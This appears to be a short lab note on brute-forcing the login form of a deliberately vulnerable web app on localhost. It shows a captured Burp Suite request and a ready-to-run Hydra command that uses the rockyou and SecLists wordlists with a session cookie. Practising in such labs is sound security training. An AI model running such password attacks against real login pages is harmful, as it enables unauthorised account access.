# Brute Force

## Burpsuite
```text
GET /vulnerabilities/brute/?username=user&password=pass&Login=Login HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/vulnerabilities/brute/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=f32rmt787hnneimo6t57l6kra0; security=low
Connection: keep-alive
```

## Hydra brute force
```shell
hydra -L /usr/share/wordlists/seclists/Usernames/Names/names.txt -P /usr/share/wordlists/rockyou.txt localhost http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=f32rmt787hnneimo6t57l6kra0; security=low:F=Username and/or password incorrect."
```